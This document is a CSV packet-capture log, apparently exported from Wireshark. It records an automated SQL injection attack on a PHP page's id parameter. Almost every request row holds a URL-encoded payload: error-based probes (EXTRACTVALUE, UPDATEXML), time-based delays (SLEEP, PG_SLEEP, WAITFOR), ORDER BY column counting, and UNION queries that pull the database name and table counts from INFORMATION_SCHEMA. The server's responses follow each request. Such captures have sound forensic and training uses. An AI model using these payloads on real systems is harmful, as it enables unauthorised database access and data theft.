"No.","Time","Source","Destination","Protocol","Length","Info"
"214","2014-09-03 15:02:26.250530","10.0.0.101","10.0.0.201","HTTP","586","GET /message.php?id=1%20AND%20EXTRACTVALUE%289200%2CCONCAT%280x5c%2C0x7173636371%2C%28SELECT%20%28CASE%20WHEN%20%289200%3D9200%29%20THEN%201%20ELSE%200%20END%29%29%2C0x716f757371%29%29 HTTP/1.1 "
"216","2014-09-03 15:02:26.251971","10.0.0.201","10.0.0.101","HTTP","432","HTTP/1.1 200 OK  (text/html)"
"224","2014-09-03 15:02:26.265267","10.0.0.101","10.0.0.201","HTTP","590","GET /message.php?id=1%20AND%20UPDATEXML%284749%2CCONCAT%280x2e%2C0x7173636371%2C%28SELECT%20%28CASE%20WHEN%20%284749%3D4749%29%20THEN%201%20ELSE%200%20END%29%29%2C0x716f757371%29%2C3987%29 HTTP/1.1 "
"226","2014-09-03 15:02:26.266942","10.0.0.201","10.0.0.101","HTTP","434","HTTP/1.1 200 OK  (text/html)"
"234","2014-09-03 15:02:26.273983","10.0.0.101","10.0.0.201","HTTP","758","GET /message.php?id=1%20AND%20ROW%286280%2C7280%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7173636371%2C%28SELECT%20%28CASE%20WHEN%20%286280%3D6280%29%20THEN%201%20ELSE%200%20END%29%29%2C0x716f757371%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204996%20UNION%20SELECT%205773%20UNION%20SELECT%208445%20UNION%20SELECT%203647%29a%20GROUP%20BY%20x%29 HTTP/1.1 "
"236","2014-09-03 15:02:26.275863","10.0.0.201","10.0.0.101","HTTP","485","HTTP/1.1 200 OK  (text/html)"
"244","2014-09-03 15:02:26.282935","10.0.0.101","10.0.0.201","HTTP","744","GET /message.php?id=1%20AND%208950%3DCAST%28%28CHR%28113%29%7C%7CCHR%28115%29%7C%7CCHR%2899%29%7C%7CCHR%2899%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288950%3D8950%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28111%29%7C%7CCHR%28117%29%7C%7CCHR%28115%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29 HTTP/1.1 "
"246","2014-09-03 15:02:26.284578","10.0.0.201","10.0.0.101","HTTP","442","HTTP/1.1 200 OK  (text/html)"
"254","2014-09-03 15:02:26.291789","10.0.0.101","10.0.0.201","HTTP","733","GET /message.php?id=1%20AND%204591%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28115%29%2BCHAR%2899%29%2BCHAR%2899%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284591%3D4591%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28111%29%2BCHAR%28117%29%2BCHAR%28115%29%2BCHAR%28113%29%29%29 HTTP/1.1 "
"256","2014-09-03 15:02:26.293199","10.0.0.201","10.0.0.101","HTTP","437","HTTP/1.1 200 OK  (text/html)"
"264","2014-09-03 15:02:26.305897","10.0.0.101","10.0.0.201","HTTP","815","GET /message.php?id=1%20AND%209441%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28115%29%7C%7CCHR%2899%29%7C%7CCHR%2899%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289441%3D9441%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28111%29%7C%7CCHR%28117%29%7C%7CCHR%28115%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29 HTTP/1.1 "
"266","2014-09-03 15:02:26.307475","10.0.0.201","10.0.0.101","HTTP","454","HTTP/1.1 200 OK  (text/html)"
"274","2014-09-03 15:02:26.314215","10.0.0.101","10.0.0.201","HTTP","427","GET /message.php?id=-5073 HTTP/1.1 "
"276","2014-09-03 15:02:26.315434","10.0.0.201","10.0.0.101","HTTP","269","HTTP/1.1 200 OK  (text/html)"
"284","2014-09-03 15:02:26.318156","10.0.0.101","10.0.0.201","HTTP","706","GET /message.php?id=-5399%20OR%20%28SELECT%206398%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7173636371%2C%28SELECT%20%28CASE%20WHEN%20%286398%3D6398%29%20THEN%201%20ELSE%200%20END%29%29%2C0x716f757371%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29 HTTP/1.1 "
"286","2014-09-03 15:02:26.319760","10.0.0.201","10.0.0.101","HTTP","482","HTTP/1.1 200 OK  (text/html)"
"294","2014-09-03 15:02:26.326591","10.0.0.101","10.0.0.201","HTTP","585","GET /message.php?id=1%20OR%20EXTRACTVALUE%286799%2CCONCAT%280x5c%2C0x7173636371%2C%28SELECT%20%28CASE%20WHEN%20%286799%3D6799%29%20THEN%201%20ELSE%200%20END%29%29%2C0x716f757371%29%29 HTTP/1.1 "
"296","2014-09-03 15:02:26.327967","10.0.0.201","10.0.0.101","HTTP","431","HTTP/1.1 200 OK  (text/html)"
"304","2014-09-03 15:02:26.343936","10.0.0.101","10.0.0.201","HTTP","589","GET /message.php?id=1%20OR%20UPDATEXML%287447%2CCONCAT%280x2e%2C0x7173636371%2C%28SELECT%20%28CASE%20WHEN%20%287447%3D7447%29%20THEN%201%20ELSE%200%20END%29%29%2C0x716f757371%29%2C2362%29 HTTP/1.1 "
"306","2014-09-03 15:02:26.345668","10.0.0.201","10.0.0.101","HTTP","433","HTTP/1.1 200 OK  (text/html)"
"314","2014-09-03 15:02:26.352786","10.0.0.101","10.0.0.201","HTTP","761","GET /message.php?id=-4948%20OR%20ROW%284588%2C4483%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7173636371%2C%28SELECT%20%28CASE%20WHEN%20%284588%3D4588%29%20THEN%201%20ELSE%200%20END%29%29%2C0x716f757371%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%205995%20UNION%20SELECT%205727%20UNION%20SELECT%205408%20UNION%20SELECT%201239%29a%20GROUP%20BY%20x%29 HTTP/1.1 "
"316","2014-09-03 15:02:26.354763","10.0.0.201","10.0.0.101","HTTP","487","HTTP/1.1 200 OK  (text/html)"
"324","2014-09-03 15:02:26.361901","10.0.0.101","10.0.0.201","HTTP","628","GET /message.php?id=-6475%20OR%201%20GROUP%20BY%20CONCAT%280x7173636371%2C%28SELECT%20%28CASE%20WHEN%20%285401%3D5401%29%20THEN%201%20ELSE%200%20END%29%29%2C0x716f757371%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23 HTTP/1.1 "
"326","2014-09-03 15:02:26.364094","10.0.0.201","10.0.0.101","HTTP","448","HTTP/1.1 200 OK  (text/html)"
"334","2014-09-03 15:02:26.371258","10.0.0.101","10.0.0.201","HTTP","693","GET /message.php?id=%28SELECT%202068%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7173636371%2C%28SELECT%20%28CASE%20WHEN%20%282068%3D2068%29%20THEN%201%20ELSE%200%20END%29%29%2C0x716f757371%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29 HTTP/1.1 "
"336","2014-09-03 15:02:26.373109","10.0.0.201","10.0.0.101","HTTP","475","HTTP/1.1 200 OK  (text/html)"
"344","2014-09-03 15:02:26.380235","10.0.0.101","10.0.0.201","HTTP","582","GET /message.php?id=%28EXTRACTVALUE%285117%2CCONCAT%280x5c%2C0x7173636371%2C%28SELECT%20%28CASE%20WHEN%20%285117%3D5117%29%20THEN%201%20ELSE%200%20END%29%29%2C0x716f757371%29%29%29 HTTP/1.1 "
"346","2014-09-03 15:02:26.381675","10.0.0.201","10.0.0.101","HTTP","428","HTTP/1.1 200 OK  (text/html)"
"354","2014-09-03 15:02:26.388624","10.0.0.101","10.0.0.201","HTTP","586","GET /message.php?id=%28UPDATEXML%285054%2CCONCAT%280x2e%2C0x7173636371%2C%28SELECT%20%28CASE%20WHEN%20%285054%3D5054%29%20THEN%201%20ELSE%200%20END%29%29%2C0x716f757371%29%2C9304%29%29 HTTP/1.1 "
"356","2014-09-03 15:02:26.390048","10.0.0.201","10.0.0.101","HTTP","430","HTTP/1.1 200 OK  (text/html)"
"364","2014-09-03 15:02:26.399094","10.0.0.101","10.0.0.201","HTTP","559","GET /message.php?id=%28SELECT%20CONCAT%280x7173636371%2C%28SELECT%20%28CASE%20WHEN%20%283017%3D3017%29%20THEN%201%20ELSE%200%20END%29%29%2C0x716f757371%29%29 HTTP/1.1 "
"366","2014-09-03 15:02:26.400673","10.0.0.201","10.0.0.101","HTTP","408","HTTP/1.1 200 OK  (text/html)"
"374","2014-09-03 15:02:26.413121","10.0.0.101","10.0.0.201","HTTP","717","GET /message.php?id=%28SELECT%20%28CHR%28113%29%7C%7CCHR%28115%29%7C%7CCHR%2899%29%7C%7CCHR%2899%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%282525%3D2525%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28111%29%7C%7CCHR%28117%29%7C%7CCHR%28115%29%7C%7CCHR%28113%29%29%29 HTTP/1.1 "
"376","2014-09-03 15:02:26.414337","10.0.0.201","10.0.0.101","HTTP","419","HTTP/1.1 200 OK  (text/html)"
"384","2014-09-03 15:02:26.426246","10.0.0.101","10.0.0.201","HTTP","697","GET /message.php?id=%28SELECT%20CHAR%28113%29%2BCHAR%28115%29%2BCHAR%2899%29%2BCHAR%2899%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%288051%3D8051%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28111%29%2BCHAR%28117%29%2BCHAR%28115%29%2BCHAR%28113%29%29 HTTP/1.1 "
"386","2014-09-03 15:02:26.427708","10.0.0.201","10.0.0.101","HTTP","458","HTTP/1.1 200 OK  (text/html)"
"394","2014-09-03 15:02:26.434513","10.0.0.101","10.0.0.201","HTTP","723","GET /message.php?id=%28SELECT%20CHR%28113%29%7C%7CCHR%28115%29%7C%7CCHR%2899%29%7C%7CCHR%2899%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281852%3D1852%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28111%29%7C%7CCHR%28117%29%7C%7CCHR%28115%29%7C%7CCHR%28113%29%20FROM%20DUAL%29 HTTP/1.1 "
"396","2014-09-03 15:02:26.435946","10.0.0.201","10.0.0.101","HTTP","422","HTTP/1.1 200 OK  (text/html)"
"404","2014-09-03 15:02:26.442611","10.0.0.101","10.0.0.201","HTTP","545","GET /message.php?id=SELECT%20%27qsccq%27%7C%7C%28SELECT%20%28CASE%20WHEN%20%281913%3D1913%29%20THEN%201%20ELSE%200%20END%29%29%7C%7C%27qousq%27 HTTP/1.1 "
"406","2014-09-03 15:02:26.443818","10.0.0.201","10.0.0.101","HTTP","395","HTTP/1.1 200 OK  (text/html)"
"414","2014-09-03 15:02:26.450575","10.0.0.101","10.0.0.201","HTTP","455","GET /message.php?id=1%3B%20SELECT%20SLEEP%285%29--%20 HTTP/1.1 "
"416","2014-09-03 15:02:26.451667","10.0.0.201","10.0.0.101","HTTP","285","HTTP/1.1 200 OK  (text/html)"
"424","2014-09-03 15:02:26.464120","10.0.0.101","10.0.0.201","HTTP","487","GET /message.php?id=1%3B%20SELECT%20BENCHMARK%285000000%2CMD5%280x6b675955%29%29--%20 HTTP/1.1 "
"426","2014-09-03 15:02:26.465314","10.0.0.201","10.0.0.101","HTTP","311","HTTP/1.1 200 OK  (text/html)"
"434","2014-09-03 15:02:26.471213","10.0.0.101","10.0.0.201","HTTP","455","GET /message.php?id=1%3B%20SELECT%20PG_SLEEP%285%29-- HTTP/1.1 "
"436","2014-09-03 15:02:26.472280","10.0.0.201","10.0.0.101","HTTP","287","HTTP/1.1 200 OK  (text/html)"
"444","2014-09-03 15:02:26.478230","10.0.0.101","10.0.0.201","HTTP","464","GET /message.php?id=1%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1 "
"446","2014-09-03 15:02:26.479388","10.0.0.201","10.0.0.101","HTTP","290","HTTP/1.1 200 OK  (text/html)"
"454","2014-09-03 15:02:26.485825","10.0.0.101","10.0.0.201","HTTP","444","GET /message.php?id=1%20AND%20SLEEP%285%29 HTTP/1.1 "
"456","2014-09-03 15:02:31.487120","10.0.0.201","10.0.0.101","HTTP","278","HTTP/1.1 200 OK  (text/html)"
"464","2014-09-03 15:02:31.493878","10.0.0.101","10.0.0.201","HTTP","444","GET /message.php?id=1%20AND%20SLEEP%285%29 HTTP/1.1 "
"466","2014-09-03 15:02:36.495146","10.0.0.201","10.0.0.101","HTTP","278","HTTP/1.1 200 OK  (text/html)"
"474","2014-09-03 15:02:36.509206","10.0.0.101","10.0.0.201","HTTP","443","GET /message.php?id=1%20ORDER%20BY%201%23 HTTP/1.1 "
"476","2014-09-03 15:02:36.510437","10.0.0.201","10.0.0.101","HTTP","320","HTTP/1.1 200 OK  (text/html)"
"484","2014-09-03 15:02:36.514331","10.0.0.101","10.0.0.201","HTTP","446","GET /message.php?id=1%20ORDER%20BY%207098%23 HTTP/1.1 "
"486","2014-09-03 15:02:36.515607","10.0.0.201","10.0.0.101","HTTP","280","HTTP/1.1 200 OK  (text/html)"
"494","2014-09-03 15:02:36.519557","10.0.0.101","10.0.0.201","HTTP","444","GET /message.php?id=1%20ORDER%20BY%2010%23 HTTP/1.1 "
"496","2014-09-03 15:02:36.520881","10.0.0.201","10.0.0.101","HTTP","278","HTTP/1.1 200 OK  (text/html)"
"504","2014-09-03 15:02:36.524333","10.0.0.101","10.0.0.201","HTTP","443","GET /message.php?id=1%20ORDER%20BY%206%23 HTTP/1.1 "
"506","2014-09-03 15:02:36.525686","10.0.0.201","10.0.0.101","HTTP","277","HTTP/1.1 200 OK  (text/html)"
"514","2014-09-03 15:02:36.529154","10.0.0.101","10.0.0.201","HTTP","443","GET /message.php?id=1%20ORDER%20BY%204%23 HTTP/1.1 "
"516","2014-09-03 15:02:36.530314","10.0.0.201","10.0.0.101","HTTP","277","HTTP/1.1 200 OK  (text/html)"
"524","2014-09-03 15:02:36.533834","10.0.0.101","10.0.0.201","HTTP","443","GET /message.php?id=1%20ORDER%20BY%203%23 HTTP/1.1 "
"526","2014-09-03 15:02:36.535035","10.0.0.201","10.0.0.101","HTTP","277","HTTP/1.1 200 OK  (text/html)"
"534","2014-09-03 15:02:36.538388","10.0.0.101","10.0.0.201","HTTP","443","GET /message.php?id=1%20ORDER%20BY%202%23 HTTP/1.1 "
"536","2014-09-03 15:02:36.539467","10.0.0.201","10.0.0.101","HTTP","320","HTTP/1.1 200 OK  (text/html)"
"544","2014-09-03 15:02:36.547668","10.0.0.101","10.0.0.201","HTTP","523","GET /message.php?id=1%20UNION%20ALL%20SELECT%20CONCAT%280x7173636371%2C0x794758526d5161717a71%2C0x716f757371%29%2CNULL%23 HTTP/1.1 "
"546","2014-09-03 15:02:36.549825","10.0.0.201","10.0.0.101","HTTP","445","HTTP/1.1 200 OK  (text/html)"
"554","2014-09-03 15:02:36.561987","10.0.0.101","10.0.0.201","HTTP","523","GET /message.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7173636371%2C0x677752626a685379694d%2C0x716f757371%29%23 HTTP/1.1 "
"556","2014-09-03 15:02:36.563952","10.0.0.201","10.0.0.101","HTTP","447","HTTP/1.1 200 OK  (text/html)"
"564","2014-09-03 15:02:36.568400","10.0.0.101","10.0.0.201","HTTP","527","GET /message.php?id=-5781%20UNION%20ALL%20SELECT%20CONCAT%280x7173636371%2C0x676155444f7959714b62%2C0x716f757371%29%2CNULL%23 HTTP/1.1 "
"566","2014-09-03 15:02:36.570251","10.0.0.201","10.0.0.101","HTTP","410","HTTP/1.1 200 OK  (text/html)"
"574","2014-09-03 15:02:36.574602","10.0.0.101","10.0.0.201","HTTP","527","GET /message.php?id=-9454%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7173636371%2C0x4f4e6943724b64424c6d%2C0x716f757371%29%23 HTTP/1.1 "
"576","2014-09-03 15:02:36.576653","10.0.0.201","10.0.0.101","HTTP","432","HTTP/1.1 200 OK  (text/html)"
"586","2014-09-03 15:02:36.608397","10.0.0.101","10.0.0.201","HTTP","658","GET /message.php?id=-7623%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7173636371%2C%28CASE%20WHEN%20%282532%3D%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%202532%29%20THEN%201%20ELSE%200%20END%29%2C0x716f757371%29%23 HTTP/1.1 "
"588","2014-09-03 15:02:36.610320","10.0.0.201","10.0.0.101","HTTP","442","HTTP/1.1 200 OK  (text/html)"
"596","2014-09-03 15:02:36.641885","10.0.0.101","10.0.0.201","HTTP","560","GET /message.php?id=-2060%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7173636371%2CIFNULL%28CAST%28DATABASE%28%29%20AS%20CHAR%29%2C0x20%29%2C0x716f757371%29%23 HTTP/1.1 "
"598","2014-09-03 15:02:36.642802","10.0.0.201","10.0.0.101","HTTP","435","HTTP/1.1 200 OK  (text/html)"
"606","2014-09-03 15:02:36.663135","10.0.0.101","10.0.0.201","HTTP","647","GET /message.php?id=-7713%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7173636371%2CIFNULL%28CAST%28COUNT%28table_name%29%20AS%20CHAR%29%2C0x20%29%2C0x716f757371%29%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20IN%20%280x697367%29%23 HTTP/1.1 "
"608","2014-09-03 15:02:36.665180","10.0.0.201","10.0.0.101","HTTP","484","HTTP/1.1 200 OK  (text/html)"
